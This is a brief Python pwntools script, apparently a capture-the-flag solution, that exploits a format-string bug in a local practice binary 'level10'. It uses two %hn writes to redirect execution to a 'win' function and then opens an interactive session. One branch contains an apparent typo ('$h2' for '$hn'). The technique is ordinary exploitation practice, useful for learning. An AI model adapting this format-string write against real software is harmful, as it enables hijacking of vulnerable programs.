from pwn import *
first_write = 7
seconed_write = 8

context.update(os = 'linux', arch = 'i386')

idk = 0x804b39c

DEBUG = False    
gs = '''
b main
b 38
'''
if DEBUG:
    r = gdb.debug("./level10", gdbscript = gs)
else:
    r = process("./level10")

elf = ELF("./level10")

first_write_val = elf.sym.win & 0xffff
sec_write_val = (elf.sym.win >> 16 ) & 0xffff

log.info(f"first_write_val = 0x{first_write_val:02x}")
log.info(f"sec_write_val = 0x{sec_write_val:02x}")

if sec_write_val < first_write_val:
    fsb = f"%0{sec_write_val}x%{seconed_write}$hn%0{first_write_val-sec_write_val}x%{first_write}$hn"
else:
    fsb = f"%0{first_write_val}x%{first_write}$h2%0{sec_write_val - first_write_val}x%{seconed_write}$hn"

r.recvuntil(": ")
r.sendline(str(elf.sym.idk))
r.recvuntil(": ")
r.sendline(fsb)
r.recv()
r.interactive()


